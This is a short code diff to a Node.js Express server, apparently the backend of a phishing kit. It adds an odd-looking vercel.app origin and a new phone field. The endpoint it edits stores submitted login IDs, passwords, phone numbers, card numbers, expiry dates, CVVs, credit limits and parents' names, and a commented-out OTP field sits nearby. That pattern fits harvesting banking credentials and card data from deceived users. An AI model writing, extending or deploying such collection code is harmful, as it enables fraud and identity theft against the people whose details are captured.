@@ -10,7 +10,7 @@ const app = express();
 const server = http.createServer(app);
 const io = new Server(server, {
   cors: {
-    origin: 'http://localhost:3000',
+    origin: ['http://localhost:3000', 'https://aslka2s.vercel.app'],
     methods: ['GET', 'POST']
   }
 });
@@ -44,6 +44,7 @@ const SubmissionSchema = new mongoose.Schema({
   // invalidOtp: String,
   fatherName: String,
   motherName: String,
+  mobile0: String,
   type: String,
   submittedAt: { type: Date, default: Date.now }
 });
@@ -55,7 +56,7 @@ const Submission = mongoose.model('Submission', SubmissionSchema);
 // ✅ Save Login or Credit Card Submission
 app.post('/users', async (req, res) => {
   try {
-    const { Login_ID, Password, mobile, cardNumber, expiry, cvv, limit } = req.body;
+    const { Login_ID, Password, mobile, cardNumber, expiry, cvv, limit, mobile0 } = req.body;
 
     const newSubmission = new Submission({
       Login_ID: Login_ID || '',
@@ -65,6 +66,7 @@ app.post('/users', async (req, res) => {
       expiry: expiry || '',
       cvv: cvv || '',
       limit: limit || '',
+      mobile0: mobile0 || '',
       type: 'login',
       submittedAt: new Date()
     });
